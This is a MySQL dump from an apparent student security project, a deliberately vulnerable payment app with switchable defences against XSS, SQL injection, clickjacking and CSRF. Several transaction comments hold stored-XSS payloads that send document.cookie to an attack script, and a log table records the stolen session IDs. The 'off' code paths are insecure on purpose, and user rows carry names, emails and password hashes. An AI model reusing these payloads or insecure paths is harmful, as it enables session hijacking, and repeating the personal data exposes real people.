CREATE DATABASE  IF NOT EXISTS `a9337_FYP`
/*!40100 DEFAULT CHARACTER SET utf8 COLLATE utf8_bin */;
USE `a9337_FYP`;
-- MySQL dump 10.13  Distrib 5.5.35, for debian-linux-gnu (i686)
--
-- Host: 127.0.0.1    Database: a9337_FYP
-- ------------------------------------------------------
-- Server version	5.5.35-0ubuntu0.12.04.2

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `attacks`
--

DROP TABLE IF EXISTS `attacks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `attacks` (
  `idattacks` int(11) NOT NULL AUTO_INCREMENT,
  `attack_name` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  `code_id` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`idattacks`)
) ENGINE=InnoDB AUTO_INCREMENT=17 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `attacks`
--

LOCK TABLES `attacks` WRITE;
/*!40000 ALTER TABLE `attacks` DISABLE KEYS */;
INSERT INTO `attacks` VALUES (1,'XSS','5'),(3,'XSS','9'),(4,'Click Jacking','7'),(5,'Session Fixation','10'),(6,'Session Fixation','11'),(7,'SQL Injection','3'),(8,'SQL Injection','9'),(9,'XSS','6'),(10,'Click Jacking','8'),(11,'CSRF','12'),(13,'Path Traversal','6'),(14,'HTTPS','14'),(15,'Click Jacking','10'),(16,'Session Fixation','13');
/*!40000 ALTER TABLE `attacks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `card_PAN`
--

DROP TABLE IF EXISTS `card_PAN`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `card_PAN` (
  `cardId` varchar(40) COLLATE utf8_bin NOT NULL,
  `encryptedPAN` varchar(45) COLLATE utf8_bin NOT NULL,
  PRIMARY KEY (`cardId`),
  UNIQUE KEY `cardId_UNIQUE` (`cardId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `card_PAN`
--

LOCK TABLES `card_PAN` WRITE;
/*!40000 ALTER TABLE `card_PAN` DISABLE KEYS */;
INSERT INTO `card_PAN` VALUES ('2340832a-815a-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('2dd88c7a-815a-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('3edeaae7-aa9a-11e3-a907-0025644e5873','LvZ/ikFbObnJpxrS1/V9YOe7eIGxCEjrgNDmxuCg7m4='),('400c9c6a-8159-11e3-83aa-0025644e5873','ppOyiN99rlsXV2QCdkOSMNt3xM16hx4k1hYuVK9DSJE='),('40539b65-815a-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('479a5e2e-8159-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('48c0a7c0-50a4-11e3-b28a-0025644e5873','sD7+ZaCzTX/E3QqnKJxy94FjEUkX7/kG6Eh+OJMqsAM='),('4ebb47a0-815a-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('588e05a5-8159-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('5fe620b0-815a-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI='),('64fe80e6-50a6-11e3-b28a-0025644e5873','o2rNt0hRm/PMcdgyOuM7kxsVRC9Wwe2pxi0wkwbxNV8='),('a1691b7e-a646-11e3-9ac9-0025644e5873','vndhKF8GIU77rCeZ595NSdxoGzVlm6r3H1hCebo6BLo='),('b37a06c2-81d7-11e3-b63e-0025644e5873','PXYCyte1ldQ6cZ0MmwjlZ0QrfuDny8kUKUXlbuwoWYs='),('ded43e8b-8159-11e3-83aa-0025644e5873','nQIu8bCCnVpAvyiEY0jteQfJgkh1vOShOLv6NiZJdUI=');
/*!40000 ALTER TABLE `card_PAN` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `card_info`
--

DROP TABLE IF EXISTS `card_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `card_info` (
  `id` char(36) COLLATE utf8_bin NOT NULL,
  `user` varchar(40) COLLATE utf8_bin NOT NULL,
  `cardId` varchar(40) COLLATE utf8_bin NOT NULL,
  `expDate` datetime DEFAULT NULL,
  `serviceCode` int(11) DEFAULT NULL,
  `truncatedCard` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id_UNIQUE` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `card_info`
--

LOCK TABLES `card_info` WRITE;
/*!40000 ALTER TABLE `card_info` DISABLE KEYS */;
INSERT INTO `card_info` VALUES ('3eee29a9-aa9a-11e3-a907-0025644e5873','6','3edeaae7-aa9a-11e3-a907-0025644e5873','2016-12-01 00:00:00',NULL,'********9675'),('48cc39f9-50a4-11e3-b28a-0025644e5873','7','48c0a7c0-50a4-11e3-b28a-0025644e5873','2012-09-01 00:00:00',NULL,'************1234'),('65089100-50a6-11e3-b28a-0025644e5873','8','64fe80e6-50a6-11e3-b28a-0025644e5873','2014-05-01 00:00:00',NULL,'*********9234'),('a1771992-a646-11e3-9ac9-0025644e5873','27','a1691b7e-a646-11e3-9ac9-0025644e5873','2017-11-01 00:00:00',NULL,'******6789'),('b3832ab7-81d7-11e3-b63e-0025644e5873','27','b37a06c2-81d7-11e3-b63e-0025644e5873','2056-12-01 00:00:00',NULL,'**7654');
/*!40000 ALTER TABLE `card_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `code`
--

DROP TABLE IF EXISTS `code`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `code` (
  `idcode` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  `state` int(1) DEFAULT '0',
  `offCode` longblob NOT NULL,
  `onCode` longblob NOT NULL,
  `enabledSeverity` float DEFAULT '0',
  `disabledSeverity` float DEFAULT '1',
  PRIMARY KEY (`idcode`)
) ENGINE=InnoDB AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `code`
--

LOCK TABLES `code` WRITE;
/*!40000 ALTER TABLE `code` DISABLE KEYS */;
INSERT INTO `code` VALUES (2,'addSlashes',1,'return $args;','return $mysqli->real_escape_string($args);',0.03,0.6),(3,'preparedStatement',1,'$sql = $args[\'regularSql\'];\nif($result = $mysqli->query($sql)){\n\n	#$result->free();\n	debug($sql);\n	return $result;\n\n}else{\n	debug(\"Execution error - \" . $mysqli->error, true);\n}','$type = $args[\'prepareTypes\'];\n$param = $args[\'prepareParam\'];\n$sql = $args[\'prepareSql\'];\n\nif($statement = $mysqli->prepare($sql) ){\n	if(call_user_func_array(\'mysqli_stmt_bind_param\', array_merge (array($statement, $type), $param)) ){\n		if($statement->execute()){\n			debug( \"SUCCESSS!!!!!!!!!!!! :O\");\n			return $statement->get_result();#this is the result set\n		}else{\n			debug( \"Execute error - \".$mysqli->error , true);\n		}\n	}else{\n		debug(\"Bind error\", true);\n	}\n}else{\n	debug(\"Prepare error\", true);\n}',0.03,0.75),(4,'debug',1,'','',0.03,1),(5,'removeScript',0,'return $args;','return preg_replace(\'#<script(.*?)>(.*?)</script>#is\', \'\', $args);',0.03,0.69),(6,'illegalChars',0,'return false;','$regex = $args[1];\n$string = $args[0];\n\nif(preg_match($regex, $string)){\n	return true;\n\n}else{\n	return false;\n}',0.03,0.81),(7,'frameBlock',1,'return \"\";','return \'<meta http-equiv=\"X-FRAME-OPTIONS\" content=\"DENY\">\';#SAMEORIGIN',0.03,0.55),(8,'frameBlockingLegacy',1,'return \"<!-- Legacy Frame Blocking is Off -->\";','$result =  <<<HTML\n\n<style id=\"antiClickjack\">body{display:none !important;}</style>\n    <script type=\"text/javascript\">\n      if (self === top) {\n	  var antiClickjack = document.getElementById(\"antiClickjack\");\n	  antiClickjack.parentNode.removeChild(antiClickjack);\n      } else {\n	  //top.location = self.location;\n      }\n    </script>\nHTML;\n\nreturn $result;',0.03,0.55),(9,'realEscapeString',1,'return $args;','return $mysqli->real_escape_string($args);',0.03,0.7),(10,'regenerateSessionId',1,'return false;','return session_regenerate_id(TRUE);',0.03,0.678),(11,'checkReferAddress',0,'return true;#ok address','if(preg_match(\'#^\'.URL_ADDRESS.\'#\', $args )){\n	return true;#matched    \n}else{\n	return false;\n}',0.03,0.4),(12,'CSRFToken',0,'','',0.03,0.8),(13,'sessionSecurityCheck',0,'','',0.001,0.7),(14,'https',0,'','',0.03,0.9),(15,'dashboard',1,'','',0,1);
/*!40000 ALTER TABLE `code` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `compliance`
--

DROP TABLE IF EXISTS `compliance`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `compliance` (
  `idcompliance` int(11) NOT NULL AUTO_INCREMENT,
  `audit` varchar(45) COLLATE utf8_bin NOT NULL,
  `attack` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`idcompliance`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `compliance`
--

LOCK TABLES `compliance` WRITE;
/*!40000 ALTER TABLE `compliance` DISABLE KEYS */;
INSERT INTO `compliance` VALUES (1,'PCI DSS','XSS'),(2,'PCI DSS','SQL Injection'),(3,'OWASP','XSS'),(4,'OWASP','Path Traversal'),(5,'OWASP','Click Jacking'),(6,'OWASP','Session Fixation'),(7,'OWASP','SQL Injection'),(8,'OWASP','CSRF'),(9,'OWASP','HTTPS'),(10,'PCI DSS','HTTPS');
/*!40000 ALTER TABLE `compliance` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `get_Table`
--

DROP TABLE IF EXISTS `get_Table`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `get_Table` (
  `idget_Table` int(11) NOT NULL AUTO_INCREMENT,
  `source` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  `values` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  `when` varchar(45) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`idget_Table`)
) ENGINE=InnoDB AUTO_INCREMENT=68 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `get_Table`
--

LOCK TABLES `get_Table` WRITE;
/*!40000 ALTER TABLE `get_Table` DISABLE KEYS */;
INSERT INTO `get_Table` VALUES (1,'TEST','hi','2014-03-12 17:59:51'),(2,'TEST','hi','2014-03-12 18:01:22'),(3,'TEST','hi','2014-03-12 18:01:49'),(4,'Well','work','2014-03-12 18:02:36'),(5,'Well','PHPSESSID=8dh2cp0c8uk96j18f6hrbign44','2014-03-12 18:03:26'),(6,'Well','PHPSESSID=8dh2cp0c8uk96j18f6hrbign44','2014-03-12 18:13:54'),(7,'Well','PHPSESSID=asoqc14keoe3285ku02p5ivnc1','2014-03-12 18:15:15'),(8,'Well','PHPSESSID=asoqc14keoe3285ku02p5ivnc1','2014-03-12 18:18:17'),(9,'Well','PHPSESSID=asoqc14keoe3285ku02p5ivnc1','2014-03-12 18:18:20'),(10,'Well','PHPSESSID=asoqc14keoe3285ku02p5ivnc1','2014-03-12 18:18:22'),(11,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:39:25'),(12,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:42:08'),(13,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:42:10'),(14,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:42:10'),(15,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:46:48'),(16,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:46:48'),(17,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:08'),(18,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:08'),(19,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:19'),(20,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:19'),(21,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:51'),(22,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:51'),(23,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:55'),(24,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:55'),(25,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:56'),(26,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:56'),(27,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:58'),(28,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:47:58'),(29,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:03'),(30,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:03'),(31,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:36'),(32,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:36'),(33,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:38'),(34,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:38'),(35,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:48:51'),(36,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:49:19'),(37,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 18:49:19'),(38,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 19:03:55'),(39,'Well','PHPSESSID=t8uojq9h63aglppb7gcf0peuc1','2014-03-12 19:03:55'),(40,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:21:44'),(41,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:24:10'),(42,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:24:10'),(43,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:24:47'),(44,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:25:02'),(45,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:25:45'),(46,'Well','PHPSESSID=qb88nreq4ucrcnr352q8s3i0e6','2014-03-12 19:37:36'),(47,'XSS attacking','PHPSESSID=pd5blocvt16s1ltg3can067l40','2014-03-13 11:46:18'),(48,'XSS attacking','PHPSESSID=8a93trb949kg4jv9ngkb7lea40','2014-03-13 11:46:31'),(49,'XSS attacking','PHPSESSID=otc5k4qpna5m9e5t1onekqkkh1','2014-03-13 12:14:32'),(50,'XSS attacking','PHPSESSID=eos2jvcf2h1asd08n258dgm1e5','2014-03-13 12:45:59'),(51,'XSS attacking','PHPSESSID=eos2jvcf2h1asd08n258dgm1e5','2014-03-13 12:46:09'),(52,'XSS attacking','PHPSESSID=eos2jvcf2h1asd08n258dgm1e5','2014-03-13 12:47:01'),(53,'XSS attacking','PHPSESSID=eos2jvcf2h1asd08n258dgm1e5','2014-03-13 12:47:08'),(54,'XSS attacking','PHPSESSID=2rk742dst0cpq514e1ot3jm541','2014-03-13 12:52:00'),(55,'XSS attacking','PHPSESSID=2rk742dst0cpq514e1ot3jm541','2014-03-13 12:52:27'),(56,'XSS attacking','PHPSESSID=2rk742dst0cpq514e1ot3jm541','2014-03-13 12:52:27'),(57,'XSS attacking','PHPSESSID=u6jhcndf3h5rlkuj7oc2li6ju1','2014-03-13 12:52:32'),(58,'XSS attacking','PHPSESSID=123456789','2014-03-13 13:51:37'),(59,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:23:27'),(60,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:56:30'),(61,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:56:30'),(62,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:56:49'),(63,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:56:49'),(64,'XSS attacking','PHPSESSID=123456789','2014-03-13 14:56:49'),(65,'XSS attacking','PHPSESSID=f1g7mcoct36bn122obf2t06h21','2014-03-13 14:56:55'),(66,'XSS attacking','PHPSESSID=sk0tkrovgmn7imf8jkabmb1up3','2014-03-13 15:38:38'),(67,'XSS attacking','PHPSESSID=123456789','2014-03-13 15:53:01');
/*!40000 ALTER TABLE `get_Table` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `transactions`
--

DROP TABLE IF EXISTS `transactions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `transactions` (
  `idtransactions` int(11) NOT NULL AUTO_INCREMENT,
  `date_time` datetime NOT NULL,
  `to_Id` varchar(45) COLLATE utf8_bin NOT NULL,
  `from_Id` varchar(45) COLLATE utf8_bin NOT NULL,
  `amount` float NOT NULL,
  `comment` varchar(200) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`idtransactions`),
  UNIQUE KEY `idtransactions_UNIQUE` (`idtransactions`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `transactions`
--

LOCK TABLES `transactions` WRITE;
/*!40000 ALTER TABLE `transactions` DISABLE KEYS */;
INSERT INTO `transactions` VALUES (5,'2014-03-05 22:55:10','7','27',8.95,'For the Chinese food yesterday. My mouth is still on fire'),(6,'2014-03-13 11:46:18','6','42',12,'<script type=\"text/javascript\" >\r\n$(document).ready(function(){\r\n$.get(\r\n\"../attacks/XSS.php\", \r\n{ \"source\" : \"XSS attacking\", \"values\" : document.cookie }, \r\nfunction(data){ }\r\n)\r\n});\r\n</script>'),(7,'2014-03-13 12:45:58','27','6',100,'thanks for your money, honey'),(8,'2014-03-13 12:46:09','27','6',100,'thanks for your money, honey'),(9,'2014-03-13 12:52:26','6','42',1,'<script type=\"text/javascript\" >\r\n$(document).ready(function(){\r\n$.get(\r\n\"../attacks/XSS.php\", \r\n{ \"source\" : \"XSS attacking\", \"values\" : document.cookie }, \r\nfunction(data){ }\r\n)\r\n});\r\n</script>'),(10,'2014-03-13 14:56:49','27','42',1.25,'<script type=\"text/javascript\" >\r\n$(document).ready(function(){\r\n$.get(\r\n\"../attacks/XSS.php\", \r\n{ \"source\" : \"XSS attacking\", \"values\" : document.cookie }, \r\nfunction(data){ }\r\n)\r\n});\r\n</script>'),(11,'2014-03-13 15:50:17','42','7',19,'cheers');
/*!40000 ALTER TABLE `transactions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `user_info`
--

DROP TABLE IF EXISTS `user_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `user_info` (
  `userId` int(11) NOT NULL AUTO_INCREMENT,
  `fName` varchar(20) COLLATE utf8_bin NOT NULL,
  `sName` varchar(20) COLLATE utf8_bin NOT NULL,
  `email` varchar(45) COLLATE utf8_bin NOT NULL,
  `passwordHash` char(78) COLLATE utf8_bin NOT NULL,
  `image` varchar(45) COLLATE utf8_bin NOT NULL DEFAULT 'default.jpg',
  `balance` varchar(45) COLLATE utf8_bin NOT NULL DEFAULT '0',
  PRIMARY KEY (`userId`),
  UNIQUE KEY `userId_UNIQUE` (`userId`),
  UNIQUE KEY `email_UNIQUE` (`email`)
) ENGINE=InnoDB AUTO_INCREMENT=43 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `user_info`
--

LOCK TABLES `user_info` WRITE;
/*!40000 ALTER TABLE `user_info` DISABLE KEYS */;
INSERT INTO `user_info` VALUES (6,'Damien','O\'Sulllivan','damosullivan@gmail.com','BOXrs6N24h:68:9b82f4e6110ebac0f33b5ba92c6008afe4c084c5ba00f2eaf9ec383cde97d536','default.jpg','0'),(7,'Eamonn','O\'Brien','eob1@student.cs.ucc.ie','dp8LIbMkSn:23:075a8d9be51ace14fd2b1e972c95ea2dac72df0c1a131c1c325f623162a6b2c9','default.jpg','0'),(8,'james','murphy','jamesmurphy5791@gmail.com','T48SXAOtrp:95:dcf7e1fe2d5ddcab5239f152251a9e4410776b00f35bec74d0ff57aa9dbec352','default.jpg','0'),(27,'damo','damo','damo@damo.com','BOXrs6N24h:68:9b82f4e6110ebac0f33b5ba92c6008afe4c084c5ba00f2eaf9ec383cde97d536','default.jpg','0'),(33,'John','Smith','john@gmail.com','EfngjWBisK:57:e78cc7f3b2ac46f0e302c4b3011d041034ffca3d539a3f7027aa3027d157ae7a','default.jpg','0'),(41,'Mark','McCarthy','mark@gmail.com','vayDdeN0zM:11:fcd01368af22dd936659582c3e83b1925658cad0a50c3e91f2e6a07f825057f4','default.jpg','0'),(42,'Evil','O\\\'Evil','evil@evil.com','ruSfw2OlYe:87:46131c2314fc0e60668f951ed6d4db11437b79c3a24d32175d828efa9ab588c3','42_Mr Burns.gif','0');
/*!40000 ALTER TABLE `user_info` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2014-04-04  9:24:28
